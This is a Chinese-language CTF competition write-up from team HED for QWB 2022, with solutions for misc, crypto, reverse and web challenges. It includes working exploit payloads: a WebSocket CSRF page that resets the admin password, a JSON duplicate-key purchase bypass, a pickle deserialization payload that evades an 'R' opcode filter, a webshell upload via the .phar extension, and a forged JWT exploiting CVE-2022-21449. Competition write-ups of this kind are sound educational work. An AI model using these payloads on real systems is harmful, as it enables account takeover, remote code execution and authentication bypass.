
# 强网杯2022-HED-WriteUp

**Rank: 74** *708pts 10Solved*   
`HED 是南方科技大学COMPASS实验室的CTF战队`

解题情况（全部10题）：

- [强网杯2022-HED-WirteUp](#强网杯2022-hed-wirteup)
- [MISC](#misc)
  - [签到-Misc-8](#签到-misc-8)
  - [问卷调查-Misc-27](#问卷调查-misc-27)
  - [谍影重重（二血）-Misc-271](#谍影重重二血-misc-271)
- [强网先锋](#强网先锋)
  - [rcefile-强网先锋-24](#rcefile-强网先锋-24)
  - [ASR-强网先锋-68](#asr-强网先锋-68)
  - [polydiv-强网先锋-48](#polydiv-强网先锋-48)
- [Web](#web)
  - [babyweb-Web-44](#babyweb-web-44)
  - [crash-Web-76](#crash-web-76)
- [Reverse](#reverse)
  - [GameMaster-Reverse-80](#gamemaster-reverse-80)
- [Crypto](#crypto)
  - [myJWT-Crypto-62](#myjwt-crypto-62)

# MISC
## 签到-Misc-8
签到

## 问卷调查-Misc-27
问卷

## 谍影重重（二血）-Misc-271

首先看 `config.json` 的内容，发现很像 v2ray 的配置文件，于是手搓 VMess 协议。这部分没啥好说的，就看规范和代码直接对着实现一遍，确实硬核。

``` python
import hmac
import hashlib
from Crypto.Hash import SHAKE128
from Crypto.Cipher import AES

uuid = bytes.fromhex('b831381d63244d53ad4f8cda48b30811')  # 取自 config.json

def get_timestamp(f):
    correct = f.read(16)
    t0 = 1615528962  # 取自 pcap 的时间
    for t in range(t0 - 60, t0 + 60):
        h = hmac.new(uuid, int.to_bytes(t, 8, byteorder='big'), digestmod='MD5')
        if h.digest() == correct:
            return t

def decode_send_header(f, t):
    key = hashlib.md5(uuid + b'c48619fe-8f02-49e0-b9e9-edf763e17e21').digest()
    iv = hashlib.md5(int.to_bytes(t, 8, byteorder='big') * 4).digest()
    cipher = AES.new(key, AES.MODE_CFB, iv=iv, segment_size=AES.block_size*8)
    header = cipher.decrypt(f.read(38))
    iv = header[1:17]
    key = header[17:33]
    return iv, key

def decode_recv_data(f, iv, key):
    iv = hashlib.md5(iv).digest()
    key = hashlib.md5(key).digest()
    shade = SHAKE128.new(data=iv)

    f.seek(4)
    data = b''
    count = 0
    while True:
        padding = int.from_bytes(shade.read(2), byteorder='big') % 64
        length = int.from_bytes(f.read(2), byteorder='big') ^ int.from_bytes(shade.read(2), byteorder='big')
        if length - padding == 16:
            break
        chunk = f.read(length)
        if padding > 0:
            chunk = chunk[:-padding]

        chunk_iv = int.to_bytes(count, 2, byteorder='big') + iv[2:12]
        cipher = AES.new(key, AES.MODE_GCM, chunk_iv)
        chunk = cipher.decrypt_and_verify(chunk[:-16], chunk[-16:])
        data += chunk
        count += 1
    return data

if __name__ == '__main__':
    with open('send.dat', 'rb') as f:
        t = get_timestamp(f)
        iv, key = decode_send_header(f, t)
    with open('recv.dat', 'rb') as f:
        data = decode_recv_data(f, iv, key)
    with open('content.txt', 'wb') as f:
        f.write(data)
```

然后发现是一个 HTTP 请求，把 html 里面的东西保存，得到了一个 `0208_54741869750132.doc`。

doc文档下载后火绒报毒不断，分离出的dll文件看起来并不简单，考虑到大概率要提取宏病毒中的API地址，直接把文件上传到微步云沙箱分析行为，发现是真的病毒（https://s.threatbook.com/report/file/3a5648f7de99c4f87331c36983fc8adcd667743569a19c8dafdd5e8a33de154d）

同时在样本报告里找到了api地址 `api.ipify.org`  
（看起来并不是只有我们是这样做的，写wp时发现7月31又被上传了几次）

解压后拿到一个自称是GOB文件的二进制，怀疑是go的序列化对象或者是游戏资源文件，把文件头8字节十六进制放到谷歌里可以搜到一个github的poc仓库，因此确认该文件是go的打包文件。  

用 pygob 读取，里面有时间戳 `2022-07-19 14:49:56` 和一个所谓的 PNG 文件，但是这个 PNG 打不开。

然后根据提示（~~唯一有用的提示~~），这个文件打乱过。然后因为有时间，所以可以考虑用时间作为种子，把这个随机过程还原。

``` go
func main() {
	rand.Seed(1658213396)  // 2022-07-19 14:49:56

	raw, err := os.ReadFile("p.png")
	len := len(raw)
	mapping := make([]int, len)
	data := make([]byte, len)

	for i := 0; i < len; i++ {
		mapping[i] = i
	}
	rand.Shuffle(len, func(i, j int) {
		mapping[i], mapping[j] = mapping[j], mapping[i]
	})
	for i := 0; i < len; i++ {
		data[mapping[i]] = raw[i]
  	}

  	f, err := os.Create("q.png")
  	f.Write(data)
}
```

然后还原之后，就得到了一张正常的 PNG 图片。不过里面也不直接是 flag。经过观察，图片的白色部分和蓝色部分都是全白或全蓝，没有信息。不过字的边缘有点意思。经过尝试，发现排除全白和全蓝像素之后，把 alpha 的数据直接提取拼接之后，就是 flag 了。

``` python
from PIL import Image
img = Image.open('q.png')
for x in img.getdata():
    if x != (255, 255, 255, 255) and x != (0, 0, 255, 255):
        print(hex(x[3])[2:], end='')
        # 然后把输出 hex 解码一下即可
```

# 强网先锋
（推测强网先锋是难度较低的题目，但是分类未知）

## rcefile-强网先锋-24
私有环境，猜测需要简单扫描，御剑尝试100条常见路径发现www.zip源码。  

上传文件后缀过滤很严格，且没什么绕过的机会，前边也被拼接了md5，不能传.htacess

于是把所有php合法扩展名都试一遍（https://book.hacktricks.xyz/pentesting-web/file-upload） ，发现phps文件会403，继续测试剩余扩展名发现phar文件可以解析。

传马，结束。

## ASR-强网先锋-68
factordb只能获得开方的结果。

分解四个128位质数的乘积应该并不复杂，放到yafu里单线程跑不到一小时就能出来
```
SIQS elapsed time = 8.5662 seconds.
Total factoring time = 2415.3993 seconds

P39 = 223213222467584072959434495118689164399
P39 = 260594583349478633632570848336184053653
P39 = 218566259296037866647273372633238739089
P39 = 225933944608558304529179430753170813347
```

e和phi不互素，数理基础匮乏的我们并没有用`phi = (p-1)*(q-1)*(r-1)*(s-1)*p*q*r*s`梭出答案

在 https://www.modb.pro/db/404740 的讨论中找到能用的脚本，抄过来改少一个因子

sage部分
```python
n = p * q * r * s * p * q * r * s
e = 3
print(n)
phi = (p - 1) * (q - 1) * (r - 1) * (s - 1)
R.<x> = Zmod(p)[]
f = x ^ e - c
f = f.monic()
res1 = f.roots()

R.<x> = Zmod(q)[]
f = x ^e - c
f = f.monic()
res2 = f.roots()

R.<x> = Zmod(r)[]
f = x ^e - c
f = f.monic()
res3 = f.roots()

R.<x> = Zmod(s)[]
f = x ^e - c
f = f.monic()
res4 = f.roots()

print(res1,res2,res3,res4,sep='\n')
```
python部分
```python
res1=[(61230132932186378005663689217798805559, 1)]
res2=[(127287570627900634195349274487282947698, 1)]
res3=[(159183122833201520722281740271702531008, 1), (54017009972585088360569997378772209006, 1), (5366126490251257564421634982763999075, 1)]
res4=[(97828969479259149226856141068289169207, 1), (84132055525449472521332928867042183796, 1), (43972919603849682780990360817839460344, 1)]

def union(x1, x2):
    a1, m1 = x1
    a2, m2 = x2
    d = gmpy2.gcd(m1, m2)
    assert (a2 - a1) % d == 0
    p1, p2 = m1 // d, m2 // d
    _, l1, l2 = gmpy2.gcdext(p1, p2)
    k = -((a1 - a2) // d) * l1
    lcm = gmpy2.lcm(m1, m2)
    ans = (a1 + k * m1) % lcm
    return ans, lcm


def excrt(ai, mi):
    tmp = zip(ai, mi)
    return reduce(union, tmp)


for i in res1:
    for j in res2:
        for k in res3:
            for l in res4:
                ai = [i[0], j[0], k[0], l[0]]
                # print(ai)
                mi = [p, q, r, s]
                flag = excrt(ai, mi)
                flag = hex(flag[0])
                try:
                    print(bytes.fromhex(flag[2:]))
                except:
                    ...
```

## polydiv-强网先锋-48

给出等式 $a(x) \times b(x) + c(x) = r(x)$，并给出多项式 $a(x), c(x), r(x)$，求 $b(x)$。

移一下项，得到 $b(x) = \big( r(x) - c(x) \big) \div a(x)$，前面减法部分很 trivial，后面除法的部分，因为已知能整除，所以直接上多项式除法即可。

``` python
from pwn import *
import hashlib
import itertools

conn = remote('IP', PORT)

def proof():
    line = conn.recvline().decode().strip()
    conn.recv()
    hexdigest = line.split(' == ')[1]
    suffix = line[12:28]
    charset = string.ascii_letters + string.digits
    for x in itertools.product(charset, repeat=4):
        plain = ''.join(x) + suffix
        if hashlib.sha256(plain.encode()).hexdigest() == hexdigest:
            conn.sendline(''.join(x))

def decode_poly(line):
    line = line.split(' = ')[1]
    arr = None
    for item in line.split(' + '):
        p = 0 if item == '1' else (1 if item == 'x' else int(item[2:]))
        if arr is None:
            arr = [ 0 for _ in range(p + 1) ]
        arr[p] = 1
    return arr

def poly_add(x, y):
    if len(x) < len(y):
        x, y = y, x
    x = x[:]
    for i in range(len(y)):
        x[i] = (x[i] + y[i]) % 2
    return x

def poly_div(x, y):  # x / y
    x = x[:]
    b = [ 0 for _ in range(len(x)) ]
    low = min([ i for i, v in enumerate(y) if v == 1 ])
    for i in range(len(x) - low):
        c_pos = i + low
        if x[c_pos] != 0:
            b[i] = 1
            for j in range(len(y)):
                x[i + j] = (x[i + j] + y[j]) % 2
    return b

def solve():
    pr = decode_poly(conn.recvline().decode().strip())
    pa = decode_poly(conn.recvline().decode().strip())
    pc = decode_poly(conn.recvline().decode().strip())
    conn.recvline()  # Please give me the b(x) which satisfy a(x)*b(x)+c(x)=r(x)
    conn.recv()      # > b(x) =

    pb = poly_div(poly_add(pr, pc), pa)
    terms = []
    for i, v in list(enumerate(pb))[::-1]:
        if v != 0:
            terms.append('1' if i == 0 else ('x' if i == 1 else f'x^{i}'))
    conn.send(' + '.join(terms))
    print(conn.recvline())  # Success!

if __name__ == '__main__':
    proof()
    for _ in range(40):
        solve()
    conn.interactive()
```

# Web
## babyweb-Web-44

这个 bot 的主要功能就是可以用 `bugreport http://host:port/login` 这条指令，让服务器访问这个网站。经过测试，它是可以运行 JavaScript 的。

然后发现 `admin` 已经被注册了，不过我们可以尝试修改它的密码，然后尝试登录。从题面的 `docker` 命令可以知道它在本地的端口是 `8888`，所以构造一个 html 文件，来向 127.0.0.1 发送修改密码指令：

```html
<html><body><script>
ws = new WebSocket('ws://127.0.0.1:8888/bot');
ws.onopen = function() {
	ws.send('changepw 123456');
}
</script></body></html>
```

然后修改完之后用 `admin` 和 `123456` 登录，就可以到一个购物小车的后台。然后发现只有 200$，买不了 flag。不过通过观察源码，可以知道购买的逻辑分布在两个不同的后端中，其中一个检查金钱够不够，另外一个将买到的东西加入到用户属性中。所以就可以尝试走私，让「检查金钱」的觉得不用买，通过检查，让「买东西」的可以成功买到东西。经测试，下面的 payload 可以成功走私：

``` json
{
    "product":[{"id":1,"num":0},{"id":2,"num":0}],
    "product":[{"id":1,"num":1},{"id":2,"num":1}]
}
```

## crash-Web-76

观察源码：

``` py
@app.route('/balancer', methods=['GET', 'POST'])
def flag():
    pickle_data=base64.b64decode(request.cookies.get("userdata"))
    if b'R' in pickle_data or b"secret" in pickle_data:
        return "You damm hacker!"
    userdata=pickle.loads(pickle_data)
    if userdata.token!=hash(get_password(userdata.username)):
         return "Login First"
    if userdata.username=='admin':
        return "Welcome admin, here is your next challenge!"
    return "You're not admin!"
```

一眼看上去就是 pickle 反序列化利用。但是这里禁用了 `R` 指令，不过问题不大，这里可以直接用 `o` 来平替。即 `<func>(<args>tR` 等价于 `(<func><args>o`。把 pker.py 脚本简单修改一下之后就能拿来用了。

（这里队内的M神已经RCE了，但是发现没权限读nginx的配置文件，环境也是很新的好像并没有什么提权的机会）

然后下一步就是让 `token != hash(...)` 为 `False`，这个我一开始尝试从 `app.get_password` 和 `admin.secret` 拿密码，但是拿不到。所以尝试将 `token` 变成一个对象，然后把这个对象的 `__ne__` hack 为永远返回 `False`。

下为 payload：~~发现不知道为啥不需要绕 `secret`，不过要绕过也很简单，拿 `str.__add__` 绕即可~~

``` python
partial = GLOBAL('functools', 'partial')
getattr = GLOBAL('__builtin__', 'getattr')
OrderedDict = GLOBAL('collections', 'OrderedDict')
startswith = getattr(GLOBAL('__builtin__', 'str'), 'startswith')
User = GLOBAL('app', 'User')

false = partial(startswith, '1', '2')
user.__ne__ = false
forever_ne = User('1', '2')

data = OrderedDict()
data.token = forever_ne
data.username = 'admin'

return data
```

然后这个 payload 扔上去之后就进到了一个均衡负载页面。结合时事（指某垃圾二次元视频网站的事故分析），发现把 `weight` 设置成 0 可以让 `gcd` 函数死循环，最终 504 从而拿到 flag。

# Reverse
## GameMaster-Reverse-80
GitHub可以根据运行时的标题搜到原始的仓库，对照dnspy的结果简单看一下是多了一个大的后门函数，以及dll多了一个gencode，但是并没有用到。

exe里的后门函数有三个checkpoint，第一步取出message数据，第二步xor 34，第三步AES-ECB解密，密钥`Brainstorming!!!`

解密的文件前半段被赛博厨子识别为ttf字体，但是后半段显然有函数，导出给binwalk看一下被告知后半段有exe，但是没有自动分离出来，手动找到mz头分离出发现还是.net程序，继续给dnspy分析，定位到校验flag的函数，x y z三个ULONG变量未知，结果已知，flag密文已知，求得xyz即可获得解密密钥。  

结果的40个byte的每一位对应一轮的result，于是队友M神直接给Z3丢了320个约束条件，10秒就跑出来了xyz。

(怎么klee跑了10分钟都没结果呢。STP和Z3差距这么大吗)
```python
import z3

def rotate():
    global x, y, z
    x = ((((x >> 29) ^ (x >> 28) ^ (x >> 25) ^ (x >> 23)) & 1) | (x << 1)) & 0xFFFFFFFFF
    y = ((((y >> 30) ^ (y >> 27)) & 1) | (y << 1)) & 0xFFFFFFFFF
    z = ((((z >> 31) ^ (z >> 30) ^ (z >> 29) ^ (z >> 28) ^ (z >> 26) ^ (z >> 24)) & 1) | (z << 1)) & 0xFFFFFFFFF

def summary():
    global x, y, z
    return ((((z >> 32) & 1) & ((x >> 30) & 1)) ^ ((((z >> 32) & 1) ^ 1) & ((y >> 31) & 1))) & 1


x0, y0, z0 = z3.BitVecs('x y z', 33)
x, y, z = x0, y0, z0
bits = [0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1]

s = z3.Solver()
for i in range(320):
    rotate()
    s.add(summary() == bits[i])

s.check()
model = s.model()
print(model)

array = [ model[x0].as_long(), model[y0].as_long(), model[z0].as_long() ]
key = [ 0 for _ in range(12) ]
ciphertext = [60, 100, 36, 86, 51, 251, 167, 108, 116, 245, 207, 223, 40, 103, 34, 62, 22, 251, 227]

for i in range(3):
    for j in range(4):
        key[i * 4 + j] = (array[i] >> (j * 8)) & 0xFF

for i in range(len(ciphertext)):
    ciphertext[i] = ciphertext[i] ^ key[i % 12]

print(bytes(ciphertext))
```


# Crypto
## myJWT-Crypto-62

没给出fastjson的版本，结合题目描述 misc&crypto 且是公共环境，考虑并不是最新的反序列化，那就只剩java自己的库。

**CVE-2022-21449**

java验证：
```java
var keys = KeyPairGenerator.getInstance("EC").generateKeyPair();
var blankSignature = new byte[64]; // 默认是0
var sig = Signature.getInstance("SHA256WithECDSAInP1363Format");
sig.initVerify(keys.getPublic());
sig.update("admin:False".getBytes());
System.out.println(sig.verify(blankSignature));
```

签名全是0可以永远通过校验，jwt exp：
`eyJ0eXAiOiJKV1QiLCJhbGciOiJteUVTIn0=.eyJpc3MiOiJxd2IiLCJuYW1lIjoiZnJhbmsiLCJhZG1pbiI6dHJ1ZSwiZXhwIjoxODU5MjM1NjAwNzYwfQ==.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==`
